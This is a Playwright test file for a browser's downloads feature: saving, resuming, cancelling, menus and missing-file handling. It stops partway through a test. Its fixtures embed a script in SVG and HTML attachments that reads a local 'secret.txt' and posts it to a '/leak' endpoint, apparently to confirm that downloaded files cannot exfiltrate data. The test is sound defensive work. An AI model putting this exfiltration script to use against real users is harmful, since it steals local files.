import { existsSync, mkdirSync, readdirSync, readFileSync, renameSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { createServer, type ServerResponse } from 'node:http'
import type { AddressInfo } from 'node:net'
import { join } from 'node:path'
import { pathToFileURL } from 'node:url'
import { expect, type Page, test } from '@playwright/test'
import type { MainContext } from '../../src/main/context'
import type { DownloadEntry } from '../../src/shared/commands/downloads'
import type { Download, OrbitState } from '../../src/shared/state'
import {
  action,
  activeTabId,
  FRAME_SLACK,
  isMac,
  launchOrbit,
  listenInRange,
  MOD,
  type Orbit,
  run,
  state,
  tabPage,
  viewPage,
} from './helpers'
import { closeWindow, cmdIn, uiPageOf, windowList } from './nav-support'
import { pressInTab } from './peek-helpers'
import { openSettings } from './settings-support'

/**
 * Downloads (DL). A local server sends the files, with an ETag and byte ranges (so a download can
 * continue where it stopped) unless `?plain`:
 * - `/file/<name>?size=` at once;
 * - `/held/<name>?size=` half at once, the rest when the test releases it;
 * - `/slow/<name>?size=&rate=` at `rate` bytes per second;
 * - `/cut/<name>?size=` a quarter, then the connection breaks, and every request breaks until the
 *   test repairs it;
 * - `/inline/<name>` as a page would serve it, with its type and no "attachment" (DL-13);
 * - `/attach/<name>` a file with content of its own (`ATTACHED`), as an attachment;
 * - `/leak?from=` takes what a downloaded file's script sends (D53): it must get nothing.
 */

const MB = 1024 * 1024

interface DownloadServer {
  url: (path: string) => string
  /** Sends the rest of a held file. */
  release: (name: string) => void
  /** Lets a cut-off file through again. */
  repair: (name: string) => void
  /** The requests for a file so far, with the byte range each asked for. */
  requests: (name: string) => { range?: string }[]
  /** What downloaded files' scripts sent to `/leak`: `<file>: <what it sent>`. */
  leaks: () => string[]
  close: () => Promise<void>
}

const PAGE = (body: string) => `<!doctype html><html><head><title>Downloads</title></head>
<body style="font: 16px system-ui; padding: 24px">${body}</body></html>`

/** A one-page PDF ("Hello PDF"), small enough to write out. */
const PDF = Buffer.from(`%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>endobj
4 0 obj<</Length 44>>stream
BT /F1 24 Tf 20 100 Td (Hello PDF) Tj ET
endstream endobj
5 0 obj<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>endobj
trailer<</Root 1 0 R>>
%%EOF
`)

/** A 1×1 PNG. */
const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
  'base64',
)

const INLINE: Record<string, { type: string; data: () => Buffer }> = {
  pdf: { type: 'application/pdf', data: () => PDF },
  png: { type: 'image/png', data: () => PNG },
  txt: { type: 'text/plain; charset=utf-8', data: () => Buffer.from('Plain text, shown as it is.') },
  webm: { type: 'video/webm', data: () => body(2048) },
  mp3: { type: 'audio/mpeg', data: () => body(2048) },
}

/**
 * Files sent as attachments (`/attach/<name>`), given where `/leak` is. An SVG and a text file with a
 * script that says it ran, reads the file `secret.txt` beside it and sends it on.
 */
const ATTACHED: Record<string, (leak: string) => string> = {
  'pic.svg': (leak) => svgThatLeaks(leak),
  'chart.svg': (leak) => svgThatLeaks(leak),
  'note.txt': (leak) => `<!doctype html><title>Note</title><script>${leakScript(leak)}</script>`,
}

function leakScript(leak: string): string {
  return `const from = location.pathname.split('/').pop();
fetch('${leak}?from=' + from, { method: 'POST', mode: 'no-cors', body: 'ran' });
fetch('secret.txt').then((r) => r.text()).then((text) =>
  fetch('${leak}?from=' + from, { method: 'POST', mode: 'no-cors', body: text }));`
}

function svgThatLeaks(leak: string): string {
  return `<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">
<rect width="64" height="64" fill="#6b7cff"/>
<script><![CDATA[${leakScript(leak)}]]></script>
</svg>`
}

function body(size: number): Buffer {
  const out = Buffer.alloc(size)
  for (let i = 0; i < size; i++) out[i] = i % 251
  return out
}

async function startDownloadServer(): Promise<DownloadServer> {
  const held = new Map<string, () => void>()
  const released = new Set<string>()
  const broken = new Set<string>()
  const repaired = new Set<string>()
  const log = new Map<string, { range?: string }[]>()
  const leaks: string[] = []
  const open = new Set<ServerResponse>()
  const server = createServer((req, res) => {
    const u = new URL(req.url ?? '/', 'http://localhost')
    const [kind, raw = ''] = u.pathname.split('/').filter(Boolean)
    const name = decodeURIComponent(raw)
    const size = Number(u.searchParams.get('size') ?? 1024)
    if (kind === 'leak') {
      let sent = ''
      req.on('data', (chunk) => {
        sent += String(chunk)
      })
      req.on('end', () => {
        leaks.push(`${u.searchParams.get('from')}: ${sent}`)
        res.writeHead(204)
        res.end()
      })
      return
    }
    const attached = kind === 'attach' ? ATTACHED[name] : undefined
    if (attached) {
      res.writeHead(200, {
        'content-type': 'application/octet-stream',
        'content-disposition': `attachment; filename="${name}"`,
      })
      res.end(attached(`http://localhost:${(server.address() as AddressInfo).port}/leak`))
      return
    }
    if (kind === 'page') {
      res.writeHead(200, { 'content-type': 'text/html' })
      res.end(
        PAGE(`<h1 id="title">${name || 'Downloads'}</h1>
          <p><a id="download" href="/file/report.pdf?size=${10 * MB}" download>Download the report</a></p>
          <p><a id="attachment" href="/file/data.csv?size=4096">Data (attachment)</a></p>
          <p><a id="new-tab" href="/file/notes.zip?size=2048" target="_blank">Notes in a new tab</a></p>
          <p><a id="held" href="/held/big.bin?size=${4 * MB}">Big file</a></p>`),
      )
      return
    }
    if (kind === 'inline') {
      const inline = INLINE[name.split('.').pop() ?? '']
      if (inline) {
        res.writeHead(200, { 'content-type': inline.type })
        res.end(inline.data())
        return
      }
    }
    if (kind !== 'file' && kind !== 'held' && kind !== 'slow' && kind !== 'cut') {
      res.writeHead(404, { 'content-type': 'text/plain' })
      res.end('not found')
      return
    }
    const range = req.headers.range
    log.set(name, [...(log.get(name) ?? []), range ? { range } : {}])
    open.add(res)
    res.on('close', () => open.delete(res))
    if (kind === 'cut' && broken.has(name)) {
      res.destroy()
      return
    }
    const data = body(size)
    const plain = u.searchParams.has('plain')
    const headers: Record<string, string> = {
      'content-type': 'application/octet-stream',
      'content-disposition': `attachment; filename="${name}"`,
      ...(plain ? {} : { etag: `"${name}-${size}"`, 'accept-ranges': 'bytes' }),
    }
    const from = !plain && range ? Number(/bytes=(\d+)-/.exec(range)?.[1] ?? 0) : 0
    if (from > 0 && from < size) {
      res.writeHead(206, {
        ...headers,
        'content-length': String(size - from),
        'content-range': `bytes ${from}-${size - 1}/${size}`,
      })
      res.end(data.subarray(from))
      return
    }
    res.writeHead(200, { ...headers, 'content-length': String(size) })
    if (kind === 'file' || (kind === 'cut' && repaired.has(name))) {
      res.end(data)
      return
    }
    if (kind === 'cut') {
      broken.add(name)
      res.write(data.subarray(0, Math.floor(size / 4)), () => setTimeout(() => res.destroy(), 100))
      return
    }
    if (kind === 'slow') {
      const chunk = Math.max(1, Math.round(Number(u.searchParams.get('rate') ?? 512 * 1024) / 20))
      let sent = 0
      const timer = setInterval(() => {
        const next = Math.min(size, sent + chunk)
        res.write(data.subarray(sent, next))
        sent = next
        if (sent < size) return
        clearInterval(timer)
        res.end()
      }, 50)
      res.on('close', () => clearInterval(timer))
      return
    }
    const half = Math.floor(size / 2)
    res.write(data.subarray(0, half))
    const finish = () => {
      held.delete(name)
      if (!res.destroyed) res.end(data.subarray(half))
    }
    if (released.has(name)) finish()
    else held.set(name, finish)
  })
  const port = await listenInRange(server, 3300 + (Number(process.env.TEST_PARALLEL_INDEX ?? 0) % 50))
  return {
    url: (path) => `http://localhost:${(server.address() as AddressInfo).port || port}${path}`,
    release: (name) => {
      released.add(name)
      held.get(name)?.()
    },
    repair: (name) => {
      broken.delete(name)
      repaired.add(name)
    },
    requests: (name) => log.get(name) ?? [],
    leaks: () => [...leaks],
    close: () =>
      new Promise((r) => {
        for (const res of open) res.destroy()
        server.close(() => r())
      }),
  }
}

let server: DownloadServer
let orbit: Orbit

test.beforeEach(async () => {
  server = await startDownloadServer()
  orbit = await launchOrbit()
  // macOS keeps the clipboard after the app quits (DL-04 copies files and links).
  await orbit.app.evaluate(({ clipboard }) => clipboard.clear())
})
test.afterEach(async () => {
  await orbit.app.close().catch(() => {})
  await server.close()
})

const folder = () => join(orbit.userData, 'Downloads')
const list = async (profileId?: string) => (await run(orbit.app, 'downloads.list', { profileId })) as Download[]
const named = async (filename: string) => (await list()).find((d) => d.filename === filename)
const sizeOf = (path: string) => (existsSync(path) ? statSync(path).size : -1)

/** Opens the fixture page in a new tab and returns it. */
async function openPage(title = 'Downloads'): Promise<{ tabId: string; page: Page }> {
  const tabId = (await run(orbit.app, 'tabs.create', { url: server.url(`/page/${title}`) })) as string
  const page = await tabPage(orbit.app, `/page/${title}`)
  await expect(page.locator('#title')).toHaveText(title)
  return { tabId, page }
}

const tabCount = async () => Object.keys((await state(orbit.app)).tabs).length

/** Starts downloads from a page, all at once (links with a `download` attribute, clicked in turn). */
async function startDownloads(page: Page, ...paths: string[]): Promise<void> {
  await page.evaluate((hrefs) => {
    for (const href of hrefs) {
      const a = document.createElement('a')
      a.href = href
      a.download = ''
      document.body.append(a)
      a.click()
      a.remove()
    }
  }, paths)
}

type Hooks = {
  opened: string[]
  shown: string[]
  trash: string
  trashFails?: boolean
  menu: () => string[]
  clickMenu: (label: string) => boolean
  settle: () => Promise<void>
  saveDialogs: { defaultPath: string; unavailable?: string }[]
  folderPicks: string[]
  dock: {
    progress: { value: number; mode: string } | null
    bounces: number
    notifications: { title: string; body?: string }[]
    focused?: boolean
  }
}

/** Reads the downloads test hooks (main process). */
function hooks<T>(read: (h: Hooks) => T | Promise<T>): Promise<T> {
  return orbit.app.evaluate(
    async (_e, source) =>
      new Function('h', `return (${source})(h)`)(
        (globalThis as unknown as { __orbitDownloads: unknown }).__orbitDownloads,
      ) as T,
    read.toString(),
  )
}

/** The labels of a download's menu (it never shows in test runs). */
async function menuOf(id: string): Promise<string[]> {
  await run(orbit.app, 'downloads.menu', { id })
  return hooks((h) => h.menu())
}

async function clickMenu(label: string): Promise<void> {
  const clicked = await orbit.app.evaluate(
    (_e, l) =>
      (globalThis as unknown as { __orbitDownloads: { clickMenu: (l: string) => boolean } }).__orbitDownloads.clickMenu(
        l,
      ),
    label,
  )
  expect(clicked, label).toBe(true)
}

const SHOW_IN_FOLDER = isMac ? 'Show in Finder' : 'Show in Folder'

const rows = () => orbit.shell.getByTestId('download-row')
const row = (filename: string) => orbit.shell.locator(`[data-testid="download-row"][title="${filename}"]`)
const idOf = async (filename: string) => ((await named(filename)) as Download).id
const entry = async (filename: string) => (await list()).find((d) => d.filename === filename) as DownloadEntry

/** Records the animations the shell starts (DL-02's flight, its fade and the landing). */
async function recordAnimations(): Promise<void> {
  await orbit.shell.evaluate(() => {
    const w = window as unknown as { __anims: { id: string; testid: string | null; last: string }[] }
    w.__anims = []
    const animate = Element.prototype.animate
    Element.prototype.animate = function (this: Element, keyframes, options) {
      const frames = Array.isArray(keyframes) ? keyframes : []
      const id = typeof options === 'object' && options?.id ? options.id : ''
      w.__anims.push({
        id,
        testid: this.getAttribute('data-testid'),
        last: String(frames[frames.length - 1]?.transform ?? ''),
      })
      return animate.call(this, keyframes, options)
    }
  })
}

const animations = (id: string) =>
  orbit.shell.evaluate(
    (wanted) =>
      (window as unknown as { __anims: { id: string; testid: string | null; last: string }[] }).__anims.filter(
        (a) => a.id === wanted,
      ),
    id,
  )

test('[DL-01] a download link saves the file in the profile download folder; no tab opens', async () => {
  const { tabId, page } = await openPage()
  const tabsBefore = await tabCount()
  await page.locator('#download').click()
  await expect.poll(async () => (await named('report.pdf'))?.state).toBe('completed')
  const done = (await named('report.pdf')) as Download
  expect(done).toMatchObject({
    savePath: join(folder(), 'report.pdf'),
    receivedBytes: 10 * MB,
    totalBytes: 10 * MB,
    profileId: 'p-default',
  })
  expect(sizeOf(join(folder(), 'report.pdf'))).toBe(10 * MB)
  expect(readdirSync(folder()).filter((f) => f.endsWith('.crdownload'))).toEqual([])
  // The page stays where it was; the sidebar has no new tab.
  expect(await tabCount()).toBe(tabsBefore)
  expect(await activeTabId(orbit.app)).toBe(tabId)
  expect((await state(orbit.app)).tabs[tabId]?.url).toBe(server.url('/page/Downloads'))
})

test('[DL-01] the same file twice: the second is saved as "name (1)"', async () => {
  const { page } = await openPage()
  await page.locator('#attachment').click()
  await expect.poll(async () => (await named('data.csv'))?.state).toBe('completed')
  await page.locator('#attachment').click()
  await expect.poll(async () => (await named('data (1).csv'))?.state).toBe('completed')
  expect(readdirSync(folder()).sort()).toEqual(['data (1).csv', 'data.csv'])
  expect(sizeOf(join(folder(), 'data (1).csv'))).toBe(4096)
})

test('[DL-01] a download opened in a new tab leaves no tab behind and no Archive entry', async () => {
  const { tabId, page } = await openPage()
  const tabsBefore = await tabCount()
  await page.locator('#new-tab').click()
  await expect.poll(async () => (await named('notes.zip'))?.state).toBe('completed')
  await expect.poll(tabCount).toBe(tabsBefore)
  expect(await activeTabId(orbit.app)).toBe(tabId)
  const s: OrbitState = await state(orbit.app)
  expect(s.archive.filter((a) => a.url.includes('/file/'))).toEqual([])
  expect(sizeOf(join(folder(), 'notes.zip'))).toBe(2048)
})

test('[DL-01] a partial file has a temporary name, and the download outlives the page that started it', async () => {
  const { tabId, page } = await openPage()
  await page.locator('#held').click()
  const partial = join(folder(), 'big.bin.crdownload')
  await expect.poll(async () => (await named('big.bin'))?.state).toBe('progressing')
  const id = ((await named('big.bin')) as Download).id
  // While it runs: the sidebar's state has it with the bytes so far, under its temporary name.
  await expect.poll(async () => (await state(orbit.app)).downloads[id]?.receivedBytes).toBe(2 * MB)
  expect((await state(orbit.app)).downloads[id]).toMatchObject({ state: 'progressing', totalBytes: 4 * MB })
  expect(existsSync(partial)).toBe(true)
  expect(existsSync(join(folder(), 'big.bin'))).toBe(false)
  expect(await run(orbit.app, 'downloads.active')).toBe(1)
  // The page that started it closes; the download goes on.
  await run(orbit.app, 'tabs.close', { tabId })
  await expect.poll(async () => (await state(orbit.app)).tabs[tabId]).toBeUndefined()
  server.release('big.bin')
  await expect.poll(async () => (await named('big.bin'))?.state).toBe('completed')
  expect(sizeOf(join(folder(), 'big.bin'))).toBe(4 * MB)
  expect(existsSync(partial)).toBe(false)
  // Done: shown as complete for a few seconds, then off the sidebar's indicator; still in the list.
  await expect.poll(async () => (await state(orbit.app)).downloads[id], { timeout: 15_000 }).toBeUndefined()
  expect((await named('big.bin'))?.state).toBe('completed')
  expect(await run(orbit.app, 'downloads.active')).toBe(0)
})

test('[DL-01] cancelling a download deletes its partial file', async () => {
  const { page } = await openPage()
  await page.locator('#held').click()
  await expect.poll(async () => (await named('big.bin'))?.state).toBe('progressing')
  const id = ((await named('big.bin')) as Download).id
  await expect.poll(() => existsSync(join(folder(), 'big.bin.crdownload'))).toBe(true)
  await run(orbit.app, 'downloads.cancel', { id })
  await expect.poll(async () => (await named('big.bin'))?.state).toBe('cancelled')
  await expect.poll(() => readdirSync(folder())).toEqual([])
  expect((await state(orbit.app)).downloads[id]).toBeUndefined()
})

test("[DL-01] each profile's downloads are its own", async () => {
  const profileId = (await run(orbit.app, 'profiles.create', { name: 'Work' })) as string
  await run(orbit.app, 'spaces.create', { name: 'Work', profileId, activate: true })
  const { page } = await openPage('Work')
  await page.locator('#attachment').click()
  await expect.poll(async () => (await list(profileId)).map((d) => d.filename)).toEqual(['data.csv'])
  expect((await list(profileId))[0]).toMatchObject({ profileId, state: 'completed' })
  expect(await list('p-default')).toEqual([])
})

test('[DL-01] quitting with a download in progress asks first', async () => {
  const { page } = await openPage()
  await page.locator('#held').click()
  await expect.poll(async () => (await named('big.bin'))?.state).toBe('progressing')
  const asked = () =>
    orbit.app.evaluate(
      () => (globalThis as unknown as { __orbitDownloads: { asked: string[] } }).__orbitDownloads.asked,
    )
  const answer = (value: 'quit' | 'cancel') =>
    orbit.app.evaluate((_e, v) => {
      ;(globalThis as unknown as { __orbitDownloads: { quitAnswer?: string } }).__orbitDownloads.quitAnswer = v
    }, value)
  // "Cancel": Orbit keeps running, the download too.
  await answer('cancel')
  await orbit.app.evaluate(({ app }) => app.quit())
  await expect.poll(asked).toEqual(['1 download in progress, quit anyway?'])
  // Nothing started quitting: the window is there and the window manager isn't winding down.
  const windowManager = () =>
    orbit.app.evaluate(() => {
      const { ctx } = (globalThis as unknown as { __orbit: { ctx: MainContext } }).__orbit
      return { windows: ctx.windows.ids().length, quitting: ctx.windows.quitting }
    })
  expect(await windowManager()).toEqual({ windows: 1, quitting: false })
  expect((await named('big.bin'))?.state).toBe('progressing')
  // "Quit": it quits (app.close() fails the test if it doesn't).
  await answer('quit')
  await orbit.app.close()
})

// ---- DL-02: the start animation ----

test('[DL-02] a download flies from the page into the Library button; two at once fly twice', async () => {
  const { page } = await openPage()
  await recordAnimations()
  await startDownloads(page, '/file/one.csv?size=2048', '/file/two.csv?size=2048')
  await expect.poll(async () => (await animations('download-flight')).length).toBe(2)
  // Each lands on the Library button, which bounces.
  const button = await orbit.shell.getByTestId('library-button').boundingBox()
  if (!button) throw new Error('no Library button')
  const landing = `translate(${button.x + button.width / 2 - 13}px, ${button.y + button.height / 2 - 13}px)`
  for (const flight of await animations('download-flight')) {
    expect(flight.testid).toBe('download-flight')
    expect(flight.last.startsWith(landing), flight.last).toBe(true)
  }
  await expect
    .poll(async () => (await animations('download-landing')).map((a) => a.testid))
    .toEqual(['library-button', 'library-button'])
  // The flying icons are gone once they land.
  await expect(orbit.shell.getByTestId('download-flight')).toHaveCount(0)
  expect(await animations('download-fade')).toEqual([])
})

test('[DL-02] with the sidebar hidden, a toast says what is downloading', async () => {
  const { page } = await openPage()
  await recordAnimations()
  await action(orbit.app, 'sidebar.toggle')
  await expect
    .poll(
      async () =>
        (await state(orbit.app)).windows[Object.keys((await state(orbit.app)).windows)[0] as string]?.sidebar.visible,
    )
    .toBe(false)
  await page.locator('#attachment').click()
  await expect(orbit.shell.getByTestId('toast').filter({ hasText: 'Downloading data.csv' })).toHaveCount(1)
  await expect(orbit.shell.getByTestId('toast').filter({ hasText: 'Downloaded data.csv' })).toHaveCount(1)
  expect(await animations('download-flight')).toEqual([])
})

test('[DL-02] with reduced motion, the icon fades on the Library button instead of flying', async () => {
  const { page } = await openPage()
  await orbit.shell.emulateMedia({ reducedMotion: 'reduce' })
  await recordAnimations()
  await page.locator('#attachment').click()
  await expect.poll(async () => (await animations('download-fade')).length).toBe(1)
  expect(await animations('download-flight')).toEqual([])
  expect(await animations('download-landing')).toEqual([])
})

// ---- DL-03: the sidebar's downloads row ----

test('[DL-03] a running download shows its name, bytes and a falling time left; ✕ cancels it and deletes the partial file', async () => {
  const tray = orbit.shell.getByTestId('downloads-tray')
  const spaceBar = orbit.shell.getByTestId('library-button')
  // No downloads: the row takes no room.
  expect((await tray.boundingBox())?.height).toBe(0)
  const barTop = (await spaceBar.boundingBox())?.y
  const { page } = await openPage()
  await startDownloads(page, `/slow/movie.bin?size=${4 * MB}&rate=${512 * 1024}`)
  const r = row('movie.bin')
  await expect(r).toBeVisible()
  await expect(r.getByTestId('download-name')).toHaveText('movie.bin')
  const meta = r.getByTestId('download-meta')
  await expect(meta).toHaveText(/^[\d.]+ (B|KB|MB) of 4 MB · \d+ s left$/)
  const secondsLeft = async () => Number(/(\d+) s left/.exec((await meta.textContent()) ?? '')?.[1] ?? Number.NaN)
  const progress = async () => Number(await r.getByTestId('download-progress').getAttribute('aria-valuenow'))
  const firstLeft = await secondsLeft()
  const firstDone = await progress()
  expect(firstLeft).toBeGreaterThan(1)
  await expect.poll(secondsLeft, { timeout: 10_000 }).toBeLessThan(firstLeft)
  await expect.poll(progress).toBeGreaterThan(firstDone)
  // ✕: cancelled, the partial file deleted, the row gone without leaving a gap.
  await r.getByTestId('download-cancel').click()
  await expect.poll(async () => (await named('movie.bin'))?.state).toBe('cancelled')
  await expect.poll(() => readdirSync(folder())).toEqual([])
  await expect(rows()).toHaveCount(0)
  await expect.poll(async () => (await tray.boundingBox())?.height).toBe(0)
  expect((await spaceBar.boundingBox())?.y).toBe(barTop)
})

test('[DL-03] several downloads: the newest with "+N"; hovering lists them, each with its own ✕', async () => {
  const { page } = await openPage()
  await startDownloads(page, `/held/one.bin?size=${MB}`, `/held/two.bin?size=${MB}`, `/held/three.bin?size=${MB}`)
  await expect.poll(async () => (await list()).filter((d) => d.state === 'progressing').length).toBe(3)
  await expect(rows()).toHaveCount(1)
  await expect(orbit.shell.getByTestId('downloads-more')).toHaveText('+2')
  // Hovering lists all three.
  await orbit.shell.getByTestId('downloads-tray').hover()
  await expect(rows()).toHaveCount(3)
  await expect(rows().getByTestId('download-cancel')).toHaveCount(3)
  await row('two.bin').getByTestId('download-cancel').click()
  await expect(rows()).toHaveCount(2)
  await expect.poll(async () => (await named('two.bin'))?.state).toBe('cancelled')
  expect(existsSync(join(folder(), 'two.bin.crdownload'))).toBe(false)
  // Leaving folds it back to the newest; "+1" opens the list until clicked again.
  await orbit.shell.mouse.move(700, 300)
  await expect(rows()).toHaveCount(1)
  await expect(orbit.shell.getByTestId('downloads-more')).toHaveText('+1')
  await orbit.shell.getByTestId('downloads-more').click()
  await expect(rows()).toHaveCount(2)
  await orbit.shell.mouse.move(700, 300)
  await expect(rows()).toHaveCount(2)
  await orbit.shell.getByTestId('downloads-more').click()
  await orbit.shell.mouse.move(700, 300)
  await expect(rows()).toHaveCount(1)
  for (const name of ['one.bin', 'three.bin']) server.release(name)
  await expect.poll(async () => (await list()).filter((d) => d.state === 'completed').length).toBe(2)
})

test('[DL-03][DL-04] a finished download shows "done" for a few seconds; a click opens it', async () => {
  const { tabId, page } = await openPage()
  await startDownloads(page, '/file/notes.txt?size=2048')
  const r = row('notes.txt')
  await expect(r).toHaveAttribute('data-state', 'completed')
  await expect(r.getByTestId('download-meta')).toHaveText('Done · 2 KB')
  // Text opens in a tab of Orbit's own.
  await r.getByTestId('download-open').click()
  const file = pathToFileURL(join(folder(), 'notes.txt')).href
  await expect.poll(async () => (await state(orbit.app)).tabs[(await activeTabId(orbit.app)) ?? '']?.url).toBe(file)
  expect(await activeTabId(orbit.app)).not.toBe(tabId)
  // Then the row goes; the download stays in the list.
  await expect(rows()).toHaveCount(0, { timeout: 10_000 })
  expect((await named('notes.txt'))?.state).toBe('completed')
  // Anything else opens in its app.
  const tabs = await tabCount()
  await startDownloads(page, '/file/sheet.csv?size=2048')
  await row('sheet.csv').getByTestId('download-open').click()
  await expect.poll(() => hooks((h) => h.opened)).toEqual([join(folder(), 'sheet.csv')])
  expect(await tabCount()).toBe(tabs)
})

// ---- DL-15: pause, resume and retry ----

test('[DL-03][DL-15] a download cut off shows Resume, and continues where it stopped', async () => {
  const { page } = await openPage()
  await startDownloads(page, `/cut/big.bin?size=${4 * MB}`)
  const r = row('big.bin')
  await expect(r).toHaveAttribute('data-state', 'interrupted', { timeout: 15_000 })
  await expect(r.getByTestId('download-resume')).toBeVisible()
  await expect(r.getByTestId('download-meta')).toHaveText(/^Failed · /)
  expect((await entry('big.bin')).canResume).toBe(true)
  server.repair('big.bin')
  await r.getByTestId('download-resume').click()
  await expect.poll(async () => (await named('big.bin'))?.state).toBe('completed')
  // The rest came as a range, after the bytes it had.
  const ranges = server.requests('big.bin').map((q) => q.range)
  expect(ranges.at(-1)).toMatch(/^bytes=[1-9]\d*-$/)
  expect(readFileSync(join(folder(), 'big.bin')).equals(body(4 * MB))).toBe(true)
  expect(readdirSync(folder())).toEqual(['big.bin'])
})

test('[DL-15] with no way to check the rest against, a cut-off download offers Retry and starts again', async () => {
  const { page } = await openPage()
  await startDownloads(page, `/cut/plain.bin?size=${2 * MB}&plain`)
  const r = row('plain.bin')
  await expect(r).toHaveAttribute('data-state', 'interrupted', { timeout: 15_000 })
  await expect(r.getByTestId('download-retry')).toBeVisible()
  await expect(r.getByTestId('download-resume')).toHaveCount(0)
  const id = await idOf('plain.bin')
  expect(await menuOf(id)).toEqual(['Retry', 'Copy Download Link', 'Remove from List'])
  server.repair('plain.bin')
  await r.getByTestId('download-retry').click()
  await expect.poll(async () => (await named('plain.bin'))?.state).toBe('completed')
  expect(readFileSync(join(folder(), 'plain.bin')).equals(body(2 * MB))).toBe(true)
  expect((await list()).map((d) => d.filename)).toEqual(['plain.bin'])
  expect(server.requests('plain.bin').at(-1)?.range).toBeUndefined()
})

test('[DL-15] pause and resume from the row and its menu', async () => {
  const { page } = await openPage()
  await page.locator('#held').click()
  const r = row('big.bin')
  await expect.poll(async () => (await named('big.bin'))?.receivedBytes).toBe(2 * MB)
  await expect(r).toHaveAttribute('data-state', 'progressing')
  await r.click({ button: 'right' })
  await expect.poll(() => hooks((h) => h.menu())).toEqual(['Pause', 'Cancel', 'Copy Download Link'])
  await clickMenu('Pause')
  await expect(r).toHaveAttribute('data-state', 'paused')
  await expect(r.getByTestId('download-meta')).toHaveText('Paused · 2 MB of 4 MB')
  expect(await menuOf(await idOf('big.bin'))).toEqual(['Resume', 'Cancel', 'Copy Download Link'])
  // Paused, it still counts as running when quitting.
  expect(await run(orbit.app, 'downloads.active')).toBe(1)
  await r.getByTestId('download-resume').click()
  await expect(r).toHaveAttribute('data-state', 'progressing')
  server.release('big.bin')
  await expect.poll(async () => (await named('big.bin'))?.state).toBe('completed')
  expect(statSync(join(folder(), 'big.bin')).size).toBe(4 * MB)
})

test('[DL-15] a download cut off by quitting resumes after a restart', async () => {
  const { page } = await openPage()
  await page.locator('#held').click()
  await expect.poll(async () => (await named('big.bin'))?.receivedBytes).toBe(2 * MB)
  const { userData } = orbit
  await orbit.app.close()
  orbit = await launchOrbit({ userData })
  const r = row('big.bin')
  await expect(r).toHaveAttribute('data-state', 'interrupted')
  await expect(r.getByTestId('download-resume')).toBeVisible()
  // The bytes so far outlived the quit.
  const partials = readdirSync(folder()).filter((f) => f.endsWith('.crdownload'))
  expect(partials.length).toBeGreaterThan(0)
  for (const f of partials) expect(statSync(join(folder(), f)).size).toBe(2 * MB)
  expect(await named('big.bin')).toMatchObject({ state: 'interrupted', canResume: true, receivedBytes: 2 * MB })
  await r.getByTestId('download-resume').click()
  await expect.poll(async () => (await named('big.bin'))?.state).toBe('completed')
  expect(server.requests('big.bin').at(-1)?.range).toBe(`bytes=${2 * MB}-`)
  expect(readFileSync(join(folder(), 'big.bin')).equals(body(4 * MB))).toBe(true)
  expect(readdirSync(folder())).toEqual(['big.bin'])
  expect((await list()).length).toBe(1)
})

// ---- DL-04, DL-08: what can be done with a download ----

test("[DL-04] a finished download's menu opens it, shows it in its folder, copies the file and its link", async () => {
  const { page } = await openPage()
  await page.locator('#attachment').click()
  await expect.poll(async () => (await named('data.csv'))?.state).toBe('completed')
  const id = await idOf('data.csv')
  const path = join(folder(), 'data.csv')
  expect(await menuOf(id)).toEqual([
    'Open',
    SHOW_IN_FOLDER,
    'Copy File',
    'Copy Download Link',
    'Remove from List',
    'Delete File',
  ])
  await clickMenu(SHOW_IN_FOLDER)
  await expect.poll(() => hooks((h) => h.shown)).toEqual([path])
  await clickMenu('Open')
  await expect.poll(() => hooks((h) => h.opened)).toEqual([path])
  await clickMenu('Copy File')
  await expect.poll(() => orbit.app.evaluate(({ clipboard }) => clipboard.readText())).toBe(path)
  expect(await orbit.app.evaluate(({ clipboard }) => clipboard.has('text/uri-list'))).toBe(true)
  await clickMenu('Copy Download Link')
  await expect
    .poll(() => orbit.app.evaluate(({ clipboard }) => clipboard.readText()))
    .toBe(server.url('/file/data.csv?size=4096'))
  // The row's right-click shows the same menu.
  await startDownloads(page, '/file/row.csv?size=2048')
  await row('row.csv').click({ button: 'right' })
  await expect.poll(() => hooks((h) => h.menu())).toContain('Copy File')
})

test('[DL-04] a file moved away shows "File Missing" and downloads again', async () => {
  const { page } = await openPage()
  await page.locator('#attachment').click()
  await expect.poll(async () => (await named('data.csv'))?.state).toBe('completed')
  const id = await idOf('data.csv')
  rmSync(join(folder(), 'data.csv'))
  expect(await entry('data.csv')).toMatchObject({ id, missing: true })
  expect(await run(orbit.app, 'downloads.open', { id })).toBe(false)
  expect(await menuOf(id)).toEqual(['File Missing', 'Download Again', 'Copy Download Link', 'Remove from List'])
  await clickMenu('Download Again')
  await expect.poll(async () => (await list()).map((d) => [d.filename, d.state])).toEqual([['data.csv', 'completed']])
  expect((await entry('data.csv')).missing).toBeUndefined()
  expect((await entry('data.csv')).id).not.toBe(id)
  expect(statSync(join(folder(), 'data.csv')).size).toBe(4096)
})

test('[DL-04][DL-08] another file at a download\'s path is not its file: "File Missing", never opened or deleted', async () => {
  const { page } = await openPage()
  await startDownloads(page, '/file/written.csv?size=1000', '/file/moved.csv?size=1000')
  await expect.poll(async () => (await list()).filter((d) => d.state === 'completed').length).toBe(2)
  // One file written over where it is; the other moved away, and another file put at its path.
  const written = join(folder(), 'written.csv')
  const moved = join(folder(), 'moved.csv')
  const away = join(orbit.userData, 'moved.csv')
  writeFileSync(written, 'my own notes, saved over the download')
  renameSync(moved, away)
  writeFileSync(moved, 'another file with the same name')
  const others = {
    'written.csv': 'my own notes, saved over the download',
    'moved.csv': 'another file with the same name',
  }
  for (const [name, content] of Object.entries(others)) {
    const id = await idOf(name)
    // Delete File leaves that file where it is, and the download listed.
    expect(await run(orbit.app, 'downloads.delete', { id }), `deleting ${name}`).toBe(false)
    expect(sizeOf(join(folder(), name)) > 0 && readFileSync(join(folder(), name), 'utf8')).toBe(content)
    expect(await entry(name), name).toMatchObject({ id, missing: true })
    expect(await menuOf(id)).toEqual(['File Missing', 'Download Again', 'Copy Download Link', 'Remove from List'])
